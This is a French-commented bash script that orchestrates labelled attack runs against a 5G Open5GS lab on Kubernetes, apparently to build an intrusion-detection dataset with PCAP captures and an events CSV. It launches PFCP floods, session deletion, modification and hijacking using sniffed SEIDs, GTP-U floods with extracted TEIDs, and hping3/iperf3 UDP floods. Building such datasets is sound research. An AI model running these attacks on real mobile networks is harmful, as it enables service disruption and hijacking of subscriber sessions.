#!/bin/bash
# =============================================================================
# orchestrator.sh — Orchestrateur V2
# Usage: ./orchestrator.sh <scenario_file> <run_id>
# Exemple: ./orchestrator.sh scenarios/full_dataset.conf run_001
#
# Attaques supportées :
#   normal               — trafic bénin lifecycle (fond permanent)
#   pfcp_flood           — PFCP Session Establishment flood
#   pfcp_session_del     — PFCP Session Deletion (SEIDs dynamiques)
#   pfcp_session_mod     — PFCP Session Modification DROP
#   pfcp_hijack          — PFCP Session Hijacking / Redirection
#   gtp_flood            — GTP-U Flood 5G (TEIDs dynamiques)
#   udp_flood_low        — hping3 ~50 pps
#   udp_flood_medium     — hping3 ~200 pps
#   udp_flood_high       — hping3 --faster
#   udp_flood_max        — hping3 --flood
#   udp_flood_iperf      — iperf3 multi-flux tailles variées
#   ue_http_intensive    — trafic HTTP intensif depuis les UEs
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCENARIO_FILE="${1:-$SCRIPT_DIR/scenarios/full_dataset.conf}"
RUN_ID="${2:-run_001}"
EDGE="${3:-edge1}"  # edge1 ou edge2

OUTPUT_DIR="$SCRIPT_DIR/output/$RUN_ID"
PCAP_DIR="$OUTPUT_DIR/pcaps"
LOG_DIR="$OUTPUT_DIR/logs"
EVENTS_CSV="$OUTPUT_DIR/events.csv"

NAMESPACE_EDGE="open5gs-edge"
NAMESPACE_CORE="open5gs-core"

HTTP_SERVER="192.168.121.25"

# Configuration selon l'edge cible
if [[ "$EDGE" == "edge2" ]]; then
  UPF_GREP="upf3"
  UE_GREP="ueransim-ue-lifecycle-edge2"
  PFCP_SCRIPTS_DIR=~/attacks/pfcp-edge2
  GTP_SCRIPTS_DIR=~/attacks/gtp-edge2
  UPF_N3_IP="10.10.3.3"
  EDGE_LABEL="edge2"
  UPF_LABEL="upf3"
else
  UPF_GREP="upf2"
  UE_GREP="ueransim-ue-lifecycle-edge1"
  PFCP_SCRIPTS_DIR=~/attacks/pfcp
  GTP_SCRIPTS_DIR=~/attacks/gtp
  UPF_N3_IP="10.10.3.2"
  EDGE_LABEL="edge1"
  UPF_LABEL="upf2"
fi

# =============================================================================
# Pré-checks
# =============================================================================
log_pre() { echo "[$(date '+%Y-%m-%dT%H:%M:%S')] $*"; }

[[ -f "$SCENARIO_FILE" ]] || {
  log_pre "ERREUR: scénario introuvable: $SCENARIO_FILE"
  exit 1
}

log_pre "Découverte dynamique des pods..."

POD_UPF2=$(kubectl get pods -n "$NAMESPACE_EDGE" \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[*].metadata.name}' | tr ' ' '\n' | grep "$UPF_GREP" | head -1)

POD_ATTACKER=$(kubectl get pods -n "$NAMESPACE_EDGE" \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[*].metadata.name}' | tr ' ' '\n' | grep "pfcp-attacker" | head -1)

POD_UE_EDGE1=$(kubectl get pods -n "$NAMESPACE_CORE" \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[*].metadata.name}' | tr ' ' '\n' | \
  grep "$UE_GREP" | head -1)

if [[ -z "$POD_UPF2" || -z "$POD_ATTACKER" || -z "$POD_UE_EDGE1" ]]; then
  log_pre "ERREUR: pods introuvables."
  log_pre "  POD_UPF2=$POD_UPF2"
  log_pre "  POD_ATTACKER=$POD_ATTACKER"
  log_pre "  POD_UE_EDGE1=$POD_UE_EDGE1"
  exit 1
fi

# Vérifie les outils dans le pod attaquant
log_pre "Vérification des outils..."
MISSING_TOOLS=()
for tool in hping3 iperf3 python3; do
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    which "$tool" >/dev/null 2>&1 || MISSING_TOOLS+=("$tool")
done
[[ ${#MISSING_TOOLS[@]} -gt 0 ]] && \
  log_pre "WARN: outils manquants dans $POD_ATTACKER : ${MISSING_TOOLS[*]}"

# Vérifie que le pod UE a curl
kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- \
  which curl >/dev/null 2>&1 || \
  log_pre "WARN: curl absent dans $POD_UE_EDGE1 — ue_http_intensive désactivé"

# Copie les scripts d'attaque dans le pod attaquant
log_pre "Copie des scripts d'attaque..."
for script in pfcp-flood-upf2.py pfcp-session-deletion.py pfcp-extract-seids.py \
              pfcp-session-modification.py pfcp-redirection.py; do
  kubectl cp "$PFCP_SCRIPTS_DIR"/$script \
    "$POD_ATTACKER:/root/$script" -n "$NAMESPACE_EDGE" 2>/dev/null || \
    log_pre "WARN: impossible de copier $script"
done
for script in gtp-flood-upf2.py gtp-extract-mapping.py; do
  kubectl cp "$GTP_SCRIPTS_DIR"/$script \
    "$POD_ATTACKER:/root/$script" -n "$NAMESPACE_EDGE" 2>/dev/null || \
    log_pre "WARN: impossible de copier $script"
done

log_pre "  UPF           : $POD_UPF2"
log_pre "  Attaquant    : $POD_ATTACKER"
log_pre "  UE lifecycle : $POD_UE_EDGE1"

# =============================================================================
# Init
# =============================================================================
mkdir -p "$PCAP_DIR" "$LOG_DIR"
ORCHESTRATOR_LOG="$LOG_DIR/orchestrator.log"

log() { echo "[$(date '+%Y-%m-%dT%H:%M:%S')] $*" | tee -a "$ORCHESTRATOR_LOG"; }
ts()  { date '+%Y-%m-%d %H:%M:%S'; }

# =============================================================================
# Events CSV
# =============================================================================
init_events_csv() {
  echo "start_ts,end_ts,label,category,target,edge,details" > "$EVENTS_CSV"
  log "Events CSV : $EVENTS_CSV"
}

write_event() {
  local start_ts="$1" end_ts="$2" label="$3"
  local category="$4" target="$5" edge="$6" details="$7"
  details="${details//,/;}"
  echo "\"$start_ts\",\"$end_ts\",\"$label\",\"$category\",\"$target\",\"$edge\",\"$details\"" \
    >> "$EVENTS_CSV"
}

# =============================================================================
# Captures continues — streaming local via /tmp/
# =============================================================================
CAPTURE_N3_PID=""
CAPTURE_N4_PID=""

start_captures() {
  log "Démarrage captures n3 + n4 en streaming local..."

  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- \
    tcpdump -U -ni n3 -s 100 -w - > "$PCAP_DIR/${RUN_ID}_n3.pcap" \
    2>"$LOG_DIR/capture_n3.log" &
  CAPTURE_N3_PID=$!

  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- \
    tcpdump -U -ni n4 -w - > "$PCAP_DIR/${RUN_ID}_n4.pcap" \
    2>"$LOG_DIR/capture_n4.log" &
  CAPTURE_N4_PID=$!

  sleep 2
  log "Captures lancées : PID n3=$CAPTURE_N3_PID n4=$CAPTURE_N4_PID"
}

stop_captures() {
  log "Arrêt captures..."
  [[ -n "$CAPTURE_N3_PID" ]] && kill "$CAPTURE_N3_PID" 2>/dev/null || true
  [[ -n "$CAPTURE_N4_PID" ]] && kill "$CAPTURE_N4_PID" 2>/dev/null || true
  sleep 2
  log "PCAP n3 : $PCAP_DIR/${RUN_ID}_n3.pcap"
  log "PCAP n4 : $PCAP_DIR/${RUN_ID}_n4.pcap"
}

# =============================================================================
# Helpers PFCP — extraction SEIDs dynamique
# =============================================================================
extract_seids() {
  log "  Extraction SEIDs depuis la capture n4 en cours (fenetre recente)..." >&2
  # Pas de tcpdump concurrent : on lit directement le PCAP n4 que la
  # capture principale du run est déjà en train d'écrire en streaming.
  # On ne garde que les sessions vues dans les SEID_WINDOW_SEC dernières
  # secondes, pour simuler un attaquant qui vient d'obtenir un accès
  # furtif et cible les sessions actives au moment présent (pas tout
  # l'historique du run).
  local n4_pcap="$PCAP_DIR/${RUN_ID}_n4.pcap"
  local SEID_WINDOW_SEC=30
  if [[ ! -s "$n4_pcap" ]]; then
    log "  WARN: PCAP n4 introuvable ou vide ($n4_pcap)" >&2
    return
  fi
  cp "$n4_pcap" /tmp/pfcp_extract_full.pcap 2>/dev/null || true
  local last_ts
  last_ts=$(tshark -r /tmp/pfcp_extract_full.pcap -T fields -e frame.time_epoch 2>/dev/null | tail -1)
  if [[ -z "$last_ts" ]]; then
    log "  WARN: impossible de lire le timestamp du PCAP — fallback PCAP complet" >&2
    cp /tmp/pfcp_extract_full.pcap /tmp/pfcp_extract.pcap
  else
    local since_ts
    since_ts=$(python3 -c "print(${last_ts} - ${SEID_WINDOW_SEC})")
    tshark -r /tmp/pfcp_extract_full.pcap \
      -Y "frame.time_epoch >= ${since_ts}" \
      -w /tmp/pfcp_extract.pcap 2>/dev/null || \
      cp /tmp/pfcp_extract_full.pcap /tmp/pfcp_extract.pcap
  fi
  python3 "$PFCP_SCRIPTS_DIR"/pfcp-extract-seids.py /tmp/pfcp_extract.pcap 2>/dev/null | \
    grep "Arguments prets" -A1 | tail -1 | \
    grep -oP '(0x[0-9a-f]+:\d+:8805 ?)+'
}

# =============================================================================
# Helpers GTP — extraction mapping TEID dynamique
# =============================================================================
extract_teid_mapping() {
  log "  Extraction mapping TEID→UE_IP depuis n3..." >&2
  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- rm -f /tmp/gtp_extract.pcap 2>/dev/null || true
  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- \
    tcpdump -U -ni n3 udp port 2152 -w /tmp/gtp_extract.pcap -c 200 \
    2>/dev/null || true
  kubectl cp "$NAMESPACE_EDGE/$POD_UPF2:/tmp/gtp_extract.pcap" \
    /tmp/gtp_extract.pcap >/dev/null 2>&1 || true
  python3 ~/attacks/gtp/gtp-extract-mapping.py /tmp/gtp_extract.pcap 2>/dev/null | \
    grep "Arguments prets" -A1 | tail -1 | \
    grep -oP '(0x[0-9a-f]+:[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ?)+'
}

# =============================================================================
# Attaques
# =============================================================================

run_pfcp_flood() {
  local duration="$1"
  log "  → pfcp_flood (${duration}s)"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "echo '' | timeout $duration python3 /root/pfcp-flood-upf2.py" \
    2>/dev/null || true
}

run_pfcp_session_del() {
  local duration="$1"
  log "  → pfcp_session_del (${duration}s)"
  local args="${PREFETCHED_SEIDS:-}"
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID pré-extrait — extraction live..."
    args=$(extract_seids)
  fi
  PREFETCHED_SEIDS=""
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID extrait — skip"
    sleep "$duration"
    return
  fi
  log "  SEIDs : $args"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "echo '' | timeout $duration python3 /root/pfcp-session-deletion.py $args --duration $duration" \
    2>/dev/null || true
}

run_pfcp_session_mod() {
  local duration="$1"
  log "  → pfcp_session_mod DROP (${duration}s)"
  local args="${PREFETCHED_SEIDS:-}"
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID pré-extrait — extraction live..."
    args=$(extract_seids)
  fi
  PREFETCHED_SEIDS=""
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID extrait — skip"
    sleep "$duration"
    return
  fi
  log "  SEIDs : $args"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "echo '' | timeout $duration python3 /root/pfcp-session-modification.py $args --duration $duration" \
    2>/dev/null || true
}

run_pfcp_hijack() {
  local duration="$1"
  log "  → pfcp_hijack (${duration}s)"
  local args="${PREFETCHED_SEIDS:-}"
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID pré-extrait — extraction live..."
    args=$(extract_seids)
  fi
  PREFETCHED_SEIDS=""
  if [[ -z "$args" ]]; then
    log "  WARN: aucun SEID extrait — skip"
    sleep "$duration"
    return
  fi
  # Extrait uniquement les SEIDs UPF (0xXXX) sans le SEQ
  local seids
  seids=$(echo "$args" | grep -oP '0x[0-9a-f]+(?=:\d+:8805)' | tr '\n' ' ')
  log "  SEIDs : $seids"
  echo "" | bash ~/attacks/pfcp/sync-and-attack.sh $seids 2>/dev/null || true
  sleep "$duration"
}

run_gtp_flood() {
  local duration="$1"
  log "  → gtp_flood (${duration}s)"
  local mapping="${PREFETCHED_TEIDS:-}"
  if [[ -z "$mapping" ]]; then
    log "  WARN: aucun mapping pré-extrait — extraction live..."
    mapping=$(extract_teid_mapping)
  fi
  PREFETCHED_TEIDS=""
  if [[ -z "$mapping" ]]; then
    log "  WARN: aucun mapping TEID extrait — skip"
    sleep "$duration"
    return
  fi
  log "  Mapping : $mapping"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "echo '' | timeout $duration python3 /root/gtp-flood-upf2.py $mapping" \
    2>/dev/null || true
}

run_udp_flood_low() {
  local duration="$1"
  log "  → udp_flood_low ~50pps (${duration}s)"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "timeout $duration hping3 --udp -p 2152 -I n3 \
           --interval u20000 $UPF_N3_IP >/dev/null 2>&1" \
    2>/dev/null || true
}

run_udp_flood_medium() {
  local duration="$1"
  log "  → udp_flood_medium ~200pps (${duration}s)"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "timeout $duration hping3 --udp -p 2152 -I n3 \
           --interval u5000 $UPF_N3_IP >/dev/null 2>&1" \
    2>/dev/null || true
}

run_udp_flood_high() {
  local duration="$1"
  log "  → udp_flood_high --faster (${duration}s)"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "timeout $duration hping3 --udp -p 2152 -I n3 \
           --faster $UPF_N3_IP >/dev/null 2>&1" \
    2>/dev/null || true
}

run_udp_flood_max() {
  local duration="$1"
  log "  → udp_flood_max --flood (${duration}s)"
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    sh -c "timeout $duration hping3 --udp -p 2152 --flood \
           -I n3 $UPF_N3_IP >/dev/null 2>&1" \
    2>/dev/null || true
}

run_udp_flood_iperf() {
  local duration="$1"
  log "  → udp_flood_iperf multi-flux (${duration}s)"

  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- \
    sh -c "pkill -f 'iperf3 -s' 2>/dev/null; iperf3 -s -p 5201 -D 2>/dev/null" \
    2>/dev/null || true
  sleep 1

  local start_t elapsed remaining
  start_t=$(date +%s)

  for size in 64 256 512 1024 1400; do
    kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
      sh -c "iperf3 -c $UPF_N3_IP -u -b 200M -t $duration -p 5201 \
             --bind 10.10.3.250 -l $size >/dev/null 2>&1 &" \
      2>/dev/null || true
  done

  elapsed=$(( $(date +%s) - start_t ))
  remaining=$(( duration - elapsed ))
  [[ $remaining -gt 0 ]] && sleep "$remaining"

  kubectl exec "$POD_UPF2" -n "$NAMESPACE_EDGE" -- \
    pkill -f "iperf3 -s" 2>/dev/null || true
}

run_ue_http_intensive() {
  local duration="$1"
  local srv="$HTTP_SERVER"
  log "  → ue_http_intensive (${duration}s)"

  # Injecte un script nommé dans le pod pour pouvoir le killer proprement
  kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- bash -c \
    "cat > /tmp/ue_http_intensive_loop.sh << 'INNER'
#!/bin/bash
for tun in \$(ip -o -4 addr show | awk '/uesimtun/ {print \$2}'); do
  (
    while true; do
      p=\$(( RANDOM % 3 ))
      case \$p in
        0) curl --interface \"\$tun\" -m 15 -s -o /dev/null http://${srv}:8081/small.bin ;;
        1) curl --interface \"\$tun\" -m 25 -s -o /dev/null http://${srv}:8082/medium.bin ;;
        2) curl --interface \"\$tun\" -m 45 -s -o /dev/null http://${srv}:8083/video.bin ;;
      esac
      sleep \$(( RANDOM % 5 + 2 ))
    done
  ) &
done
wait
INNER
chmod +x /tmp/ue_http_intensive_loop.sh" 2>/dev/null || true

  kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- \
    bash -c "nohup /tmp/ue_http_intensive_loop.sh >/tmp/ue_intensive.log 2>&1 &" \
    2>/dev/null || true

  sleep "$duration"

  # Tue uniquement le script intensif, pas le trafic bénin lifecycle
  kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- \
    pkill -f "ue_http_intensive_loop" 2>/dev/null || true
}

# =============================================================================
# Dispatch
# =============================================================================
run_attack() {
  local attack="$1" duration="$2"
  case "$attack" in
    normal)              sleep "$duration" ;;
    pfcp_flood)          run_pfcp_flood "$duration" ;;
    pfcp_session_del)    run_pfcp_session_del "$duration" ;;
    pfcp_session_mod)    run_pfcp_session_mod "$duration" ;;
    pfcp_hijack)         run_pfcp_hijack "$duration" ;;
    gtp_flood)           run_gtp_flood "$duration" ;;
    udp_flood_low)       run_udp_flood_low "$duration" ;;
    udp_flood_medium)    run_udp_flood_medium "$duration" ;;
    udp_flood_high)      run_udp_flood_high "$duration" ;;
    udp_flood_max)       run_udp_flood_max "$duration" ;;
    udp_flood_iperf)     run_udp_flood_iperf "$duration" ;;
    ue_http_intensive)   run_ue_http_intensive "$duration" ;;
    *)
      log "WARN: attaque inconnue '$attack' → sleep"
      sleep "$duration"
      ;;
  esac
}

# =============================================================================
# Métadonnées par label
# =============================================================================
get_event_meta() {
  local label="$1"
  case "$label" in
    normal)           echo "benign   none      $EDGE_LABEL  lifecycle_background" ;;
    pfcp_flood)       echo "pfcp     ${UPF_LABEL}_n4   $EDGE_LABEL  threads=100" ;;
    pfcp_session_del) echo "pfcp     ${UPF_LABEL}_n4   $EDGE_LABEL  seids=dynamic" ;;
    pfcp_session_mod) echo "pfcp     ${UPF_LABEL}_n4   $EDGE_LABEL  action=drop;seids=dynamic" ;;
    pfcp_hijack)      echo "pfcp     ${UPF_LABEL}_n4   $EDGE_LABEL  redirect=10.10.3.250;seids=dynamic" ;;
    gtp_flood)        echo "gtp      ${UPF_LABEL}_n3   $EDGE_LABEL  teids=dynamic;threads=100" ;;
    udp_flood_low)    echo "udp      ${UPF_LABEL}_n3   $EDGE_LABEL  hping3;port=2152;rate=50pps" ;;
    udp_flood_medium) echo "udp      ${UPF_LABEL}_n3   $EDGE_LABEL  hping3;port=2152;rate=200pps" ;;
    udp_flood_high)   echo "udp      ${UPF_LABEL}_n3   $EDGE_LABEL  hping3;port=2152;rate=faster" ;;
    udp_flood_max)    echo "udp      ${UPF_LABEL}_n3   $EDGE_LABEL  hping3;port=2152;rate=flood" ;;
    udp_flood_iperf)  echo "udp      ${UPF_LABEL}_n3   $EDGE_LABEL  iperf3;5flux;200M;sizes=64-1400" ;;
    ue_http_intensive) echo "benign ${UPF_LABEL}_n3 $EDGE_LABEL high_load_http;curl;3profils" ;;
    *)                echo "unknown  unknown   $EDGE_LABEL  " ;;
  esac
}

# =============================================================================
# Nettoyage
# =============================================================================
cleanup() {
  log "--- Nettoyage ---"
  kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- \
    pkill -f "ue_http_intensive_loop" 2>/dev/null || true
  kubectl exec "$POD_UE_EDGE1" -n "$NAMESPACE_CORE" -- \
    pkill -f "/tmp/ue_http_intensive_loop.sh" 2>/dev/null || true
  kubectl exec "$POD_ATTACKER" -n "$NAMESPACE_EDGE" -- \
    pkill -f "hping3\|iperf3\|pfcp\|gtp" 2>/dev/null || true
  stop_captures || true
  log "Output : $OUTPUT_DIR"
}
trap cleanup EXIT INT TERM

# =============================================================================
# Main
# =============================================================================
log "====== ORCHESTRATEUR 5G V2 ======"
log "Scénario  : $SCENARIO_FILE"
log "Run ID    : $RUN_ID"
log "Output    : $OUTPUT_DIR"
log "UPF       : $POD_UPF2"
log "Attaquant : $POD_ATTACKER"
log "UE        : $POD_UE_EDGE1"

init_events_csv
start_captures

# Variables globales pour pré-extraction
PREFETCHED_SEIDS=""
PREFETCHED_TEIDS=""

log "Démarrage scénario — scheduler séquentiel (trafic bénin lifecycle tourne en fond)..."

# Charge le scénario en mémoire
mapfile -t SCENARIO_LINES < <(grep -v '^#' "$SCENARIO_FILE" | grep -v '^[[:space:]]*$')
SCENARIO_TOTAL=${#SCENARIO_LINES[@]}

for (( SCENARIO_IDX=0; SCENARIO_IDX<SCENARIO_TOTAL; SCENARIO_IDX++ )); do
  line="${SCENARIO_LINES[$SCENARIO_IDX]}"
  read -r offset_start offset_end label <<< "$line"

  duration=$(( (offset_end - offset_start) * 60 ))
  [[ $duration -gt 0 ]] || { log "WARN: durée invalide : '$line'"; continue; }

  read -r category target edge details <<< "$(get_event_meta "$label")"

  # Scheduler séquentiel — début = maintenant, pas d'offset absolu
  ts_start=$(ts)
  event_start_epoch=$(date +%s)
  log "=== Début : $label (${duration}s) ==="

  # Si c'est un bloc normal, pré-extrait SEIDs/TEIDs pendant les dernières 60s
  if [[ "$label" == "normal" && $SCENARIO_IDX -lt $(( SCENARIO_TOTAL - 1 )) ]]; then
    next_label=$(awk '{print $3}' <<< "${SCENARIO_LINES[$((SCENARIO_IDX + 1))]}")
    prefetch_delay=$(( duration - 60 ))
    if [[ $prefetch_delay -gt 30 ]]; then
      case "$next_label" in
        pfcp_session_del|pfcp_session_mod|pfcp_hijack)
          sleep "$prefetch_delay"
          log "  Pré-extraction SEIDs pour $next_label..."
          PREFETCHED_SEIDS=$(extract_seids)
          log "  SEIDs pré-extraits : $PREFETCHED_SEIDS"
          # Attend la fin réelle du bloc normal
          elapsed=$(( $(date +%s) - event_start_epoch ))
          remaining=$(( duration - elapsed ))
          [[ $remaining -gt 0 ]] && sleep "$remaining" || true
          ;;
        gtp_flood)
          sleep "$prefetch_delay"
          log "  Pré-extraction TEIDs pour $next_label..."
          PREFETCHED_TEIDS=$(extract_teid_mapping)
          log "  TEIDs pré-extraits : $PREFETCHED_TEIDS"
          elapsed=$(( $(date +%s) - event_start_epoch ))
          remaining=$(( duration - elapsed ))
          [[ $remaining -gt 0 ]] && sleep "$remaining" || true
          ;;
        *)
          sleep "$duration"
          ;;
      esac
    else
      sleep "$duration"
    fi
  else
    run_attack "$label" "$duration"
  fi

  ts_end=$(ts)

  label_out="$label"
  category_out="$category"

  if [[ "$label" == "ue_http_intensive" ]]; then
    label_out="normal"
    category_out="benign"
  fi

  write_event "$ts_start" "$ts_end" "$label_out" "$category_out" "$target" "$edge" "$details"
  log "=== Fin   : $label ==="

done

log "Scénario terminé."
